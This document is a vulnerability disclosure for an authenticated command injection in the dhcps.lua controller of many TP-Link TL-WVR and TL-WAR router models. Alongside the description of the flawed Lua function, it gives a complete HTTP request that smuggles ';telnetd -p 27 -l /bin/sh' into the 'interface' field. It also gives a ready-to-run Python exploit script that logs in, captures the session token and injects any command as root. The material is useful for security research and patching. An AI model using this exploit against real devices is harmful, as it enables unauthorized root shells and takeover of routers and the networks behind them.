[Vulnerability]:
Command Injection in dhcps.lua 

------------------------------------------
[Exploitation]:
Can remote command execution on the root shell.

------------------------------------------
[Vendor of Product]:
Tp-Link router

------------------------------------------
[Affected Products and firmware version]:
Tp-Link TL-WVR300		(Only hardware version v4)
Tp-Link TL-WVR302		(only hardware version v2)
Tp-Link TL-WVR450		(ALL the hardware version and firmware version)
Tp-Link TL-WVR450L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR450G		(Only hardware version v5)
Tp-Link TL-WVR458		(ALL the hardware version and firmware version)
Tp-Link TL-WVR458L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR458P		(ALL the hardware version and firmware version)
Tp-Link TL-WVR900G		(Only hardware version v3)
Tp-Link TL-WVR900L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR1200L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR1300L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR1300G		(ALL the hardware version and firmware version)
Tp-Link TL-WVR1750L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR2600L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR4300L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR302		(ALL the hardware version and firmware version)
Tp-Link TL-WAR450		(ALL the hardware version and firmware version)
Tp-Link TL-WAR450L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR458		(ALL the hardware version and firmware version)
Tp-Link TL-WAR458L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR900L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR1200L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR1300L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR1750L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR2600L		(ALL the hardware version and firmware version)

------------------------------------------
[Attack Type]:
Remote

------------------------------------------
[Reference]:
http://service.tp-link.com.cn/download/201612/TL-WVR450L%20V1.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620161125.zip  (Official firmware for TL-WVR450L)
http://www.tp-link.com.cn/product_listsmb_2008_26_00_01_02_03_04.html

------------------------------------------
[Discoverer]:
Zhaoxin Li, Chengdu Tongjin Middle School

------------------------------------------
[Affected components]:
Affected executable application: uhttpd
Affected source code file: /usr/lib/lua/luci/controller/admin/dhcps.lua
Affected function: zone_get_iface_bydev(t)

------------------------------------------
[Vulnerability details]:
After the web login Authentication, When accessing the dhcps.lua through the web manager(uhttpd), 
we can add a static dhcp lease by the controller function insert_static_lease(http_form).
During this operation, it doesn't limit and check the value of the parameter "interface" in http post data.
And in the dhcps.lua, it defines the local function zone_get_iface_bydev(t) to handle input http post data "interface".

step1.	http post to dhcps.lua and make form=reservation, method=add
step2.		--> local function insert_static_lease(http_form)
step3.			--> local function zone_get_iface_bydev(t)

local function zone_get_iface_bydev(t)
    local devices 

    local cmd = ". /lib/zone/zone_api.sh; zone_get_iface_bydev " .. t
    local ff = io.popen(cmd, "r");
    if not ff then
        return devices
    end

    local l = ff:read("*l")
    return l
end

So, we can see the local function zone_get_iface_bydev doesn't have any check and limit to the input parameter,
and it will use the io.popen to execute the shell command which include the value of the parameter "interface" in http post data.

------------------------------------------
[Exploitation details]:
Because access to the dhcps.lua requires web authentication,so it needs the web login credentials, or a session hijack vulnerability,
or a weak credentials brute force attack to get access permissions for the dhcps.lua at first. 
And then, we can use this Authenticated Remote Command Execution vulnerability to execute any command on the root shell.
For example, we can send a http post request like:

POST /cgi-bin/luci/;stok=bec73bfc68d597ef807d91d82683dfbd/admin/dhcps?form=reservation HTTP/1.1
Host: 192.168.3.1
Content-Length: 320
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://192.168.3.1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://192.168.3.1/webpages/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: sysauth=0ae3b8ccc0ce47351b8300c185a01f48
Connection: close

data=%7B%22method%22%3A%22add%22%2C%22params%22%3A%7B%22index%22%3A1%2C%22old%22%3A%22add%22%2C%22new%22%3A%7B%22interface%22%3A%22%3Btelnetd+-p+27+-l+/bin/sh%22%2C%22mac%22%3A%22D0-D1-D2-D3-D4-D5%22%2C%22ip%22%3A%22192.168.77.77%22%2C%22note%22%3A%22exploit%22%2C%22enable%22%3A%22on%22%7D%2C%22key%22%3A%22add%22%7D%7D

Finally, this http post request packet will make the router execute the command "telnetd -p 27 -l /bin/sh".

------------------------------------------
[exp.py]:
# Tested product: TL-WVR450L
# Hardware versionï¼šV1.0
# Firmware version: 20161125
# The RSA_Encryption_For_Tplink.js is use for Rsa Encryption to the password when login the web manager.
# You can download the RSA_Encryption_For_Tplink.js by https://github.com/coincoin7/Wireless-Router-Vulnerability/blob/master/RSA_Encryption_For_Tplink.js

import execjs
import requests
import json
import urllib


def read_js():
    file = open("./RSA_Encryption_For_Tplink.js", 'r')
    line = file.readline()
    js = ''
    while line:
        js = js + line
        line = file.readline()
    file.close()
    return js


def execute(ip, port, username, passwd, cmd):
    try:
        s = requests.session()

        uri = "http://{}:{}".format(ip,port)
        headers = {
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': 'http://{}/webpages/login.html'.format(ip)
            }
        payload = {
            "method":"get"
        }
        ret = s.post(uri + '/cgi-bin/luci/;stok=/login?form=login', data=urllib.urlencode({"data":json.dumps(payload)}), headers=headers, timeout=5)
        rsa_public_n = json.loads(ret.text)['result']['password'][0].encode("utf-8")
        rsa_public_e = json.loads(ret.text)['result']['password'][1].encode("utf-8")
        js = read_js()
        js_handle = execjs.compile(js)
        password = js_handle.call('MainEncrypt', rsa_public_n, rsa_public_e, passwd)

        payload = {
            "method":"login",
            "params":{
                "username":"{}".format(username),
                "password":"{}".format(password)
            }
        }
        ret = s.post(uri + '/cgi-bin/luci/;stok=/login?form=login', data=urllib.urlencode({"data":json.dumps(payload)}), headers=headers, timeout=5)
        stok = json.loads(ret.text)['result']['stok'].encode('utf-8')
        cookie = ret.headers['Set-Cookie']

        print '[+] Login success'
        print '[+] Get The Token: ' + stok
        print '[+] Get The Cookie: ' + cookie

        headers = {
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer':'http://{}/webpages/login.html'.format(ip),
            'Cookie':'{}'.format(cookie)
            }
        payload = {
            "method":"add",
            "params":{
                "index":1,
                "old":"add",
                "new":{
                    "interface":";{}".format(cmd),
                    "mac":"D0-D1-D2-D3-D4-D5",
                    "ip":"192.168.77.77",
                    "note":"exploit",
                    "enable":"on"
                },
                "key":"add"
            }
        }
        ret = s.post(uri + '/cgi-bin/luci/;stok={}/admin/dhcps?form=reservation'.format(stok), data=urllib.urlencode({"data":json.dumps(payload)}), headers=headers, timeout=5)

        #print ret.text
        print '[+] Finish RCE'
        print '--------------------------------------------------------------'
        return True

    except:
        return False


if __name__=='__main__':
    print '-----------Tplink LUCI Dhcps Authenticated RCE-----------'
    print execute('192.168.3.1', 80, 'admin', 'admin', 'telnetd -p 27 -l /bin/sh')
